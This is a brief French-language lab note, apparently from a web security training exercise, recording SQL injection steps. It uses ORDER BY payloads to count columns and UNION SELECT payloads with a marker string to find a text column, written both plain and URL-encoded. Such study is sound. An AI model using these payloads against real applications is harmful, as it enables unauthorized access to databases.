
![](Pasted%20image%2020260722155740.png)
On va determiner le nombre de columns qu'il y a quand la requete est retourner avc ORDER BY 

' ORDER BY 1--
'+ORDER+BY+1--
et ainsi de suite jusqu'à trouver le nombre de columns 

'+ORDER+BY+3--
donc 3 columns
![](Pasted%20image%2020260722155756.png)

Maintenant on veut voir lequel contient des strings avc 'a' mais avc le mot jTuOfV donc on remplace le a avc çca 

' UNION SELECT 'jTuOfV',NULL,NULL--
'+UNION+SELECT+'jTuOfV',NULL,NULL--
et ainsi de suite 

'+UNION+SELECT+NULL,'jTuOfV',NULL--
sa a marcher 
![](Pasted%20image%2020260722155833.png)
![](Pasted%20image%2020260722155842.png)
